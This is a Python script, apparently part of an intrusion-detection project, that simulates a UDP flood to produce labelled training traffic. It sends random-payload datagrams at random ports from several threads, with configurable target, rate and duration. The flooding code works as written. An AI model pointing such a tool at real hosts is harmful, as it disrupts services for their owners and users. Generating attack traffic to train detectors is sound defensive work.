#!/usr/bin/env python3
# tools/attack_simulators/udp_flood.py
# ─────────────────────────────────────────────────────────────────────────────
# UDP Flood simulator for IDS training data collection.
#
# Sends high-rate UDP datagrams with realistic payload sizes (512–1400 bytes).
# No admin required — uses regular UDP sockets.
#
# Usage:
#   python tools/attack_simulators/udp_flood.py
#   python tools/attack_simulators/udp_flood.py --target 192.168.1.1 --rate 200
#   python tools/attack_simulators/udp_flood.py --duration 300
# ─────────────────────────────────────────────────────────────────────────────

import argparse
import os
import random
import socket
import threading
import time
from datetime import datetime

DEFAULT_TARGET   = "127.0.0.1"
DEFAULT_RATE     = 200
DEFAULT_DURATION = 300

PAYLOAD_MIN  = 512
PAYLOAD_MAX  = 1400
PORT_RANGE   = (1024, 65000)


def _flood_worker(target: str, rate: int, stop_event: threading.Event,
                  counters: dict):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / max(rate, 1)

    while not stop_event.is_set():
        port    = random.randint(*PORT_RANGE)
        size    = random.randint(PAYLOAD_MIN, PAYLOAD_MAX)
        payload = os.urandom(size)
        try:
            sock.sendto(payload, (target, port))
            counters["sent"]  += 1
            counters["bytes"] += size
        except Exception:
            counters["errors"] += 1
        time.sleep(interval)

    sock.close()


def run(target: str, rate: int, duration: int):
    print()
    print("=" * 60)
    print("  UDP FLOOD SIMULATOR")
    print(f"  Target  : {target}")
    print(f"  Rate    : ~{rate} datagrams/s")
    print(f"  Payload : {PAYLOAD_MIN}–{PAYLOAD_MAX} bytes (random)")
    print(f"  Duration: {duration}s")
    print(f"  Started : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 60)
    print()
    print("  Run simultaneously:")
    print(f"    python scripts/collect_traffic_windows.py \\")
    print(f"      --interface \"Wi-Fi\" --label \"UDP Flood\" --duration {duration}")
    print()
    print("  Press Ctrl+C to stop early.")
    print()

    counters   = {"sent": 0, "bytes": 0, "errors": 0}
    stop_event = threading.Event()

    n_threads = max(1, rate // 50)
    threads = []
    for _ in range(n_threads):
        t = threading.Thread(
            target=_flood_worker,
            args=(target, rate // n_threads, stop_event, counters),
            daemon=True,
        )
        t.start()
        threads.append(t)

    start = time.time()
    try:
        while True:
            elapsed   = time.time() - start
            remaining = duration - elapsed
            if remaining <= 0:
                break
            actual_rate = counters["sent"] / max(elapsed, 0.1)
            mbps = counters["bytes"] * 8 / max(elapsed, 0.1) / 1_000_000
            print(f"\r  Sent: {counters['sent']:>8}  Rate: {actual_rate:>7.1f} pkt/s  "
                  f"{mbps:.2f} Mbps  Remaining: {int(remaining):>4}s   ",
                  end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  Stopped by user.")

    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    elapsed = time.time() - start
    print(f"\n\n  Done. Sent {counters['sent']} datagrams ({counters['bytes']//1024} KB) "
          f"in {elapsed:.1f}s")
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP Flood attack simulator")
    parser.add_argument("--target",   default=DEFAULT_TARGET)
    parser.add_argument("--rate",     type=int, default=DEFAULT_RATE,
                        help="Datagrams per second")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION,
                        help="Duration in seconds")
    args = parser.parse_args()
    run(args.target, args.rate, args.duration)
